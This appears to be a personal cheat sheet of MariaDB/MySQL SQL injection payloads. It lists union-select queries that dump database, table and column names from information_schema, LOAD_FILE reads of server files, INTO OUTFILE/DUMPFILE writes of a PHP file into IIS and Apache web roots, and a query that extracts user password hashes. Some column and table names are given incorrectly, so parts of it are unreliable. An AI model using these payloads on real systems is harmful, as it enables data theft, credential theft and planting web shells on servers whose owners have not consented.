# mariadb mysql
## SQLi
### concat multiple values into one field rows
`group_concat( query )`
`... union select 1,2,group_concat(schema_name) from information_schema.schemata`

### union injection
### information tables
`information_schema` is name of metadata database
`information_schema.schemata` is names of databases in `schema_name` column
`information_schema.columns` is names of tables and columns 
  - column `column_name` has names of columns
  - column `table_name`
  - column `schema_name` is database name
Example union injection
`... union select 1,2,group_concat(concat(table_name, ':', column_name)) from information_schema.columns where schema_name='interesting_db'`
`... union select 1,2,group_concat(table_name, ':', column_name) from information_schema.columns where schema_name='interesting_db'`

## files
### check permissions
`show grants;`

### read
`LOAD_FILE('')`

### write
at the end of the query
`INTO OUTFILE 'c:\\inetpub\\wwwroot\\test.php'`
`INTO OUTFILE '/var/www/html/test.php'`
`INTO DUMPFILE 'c:\\inetpub\\wwwroot\\test.php'`
`INTO DUMPFILE '/var/www/html/test.php'`

### read database users
hashes can either be in `Password` or `authentication_string` columns
`union select User, Password, authentication_string from mysql.users`
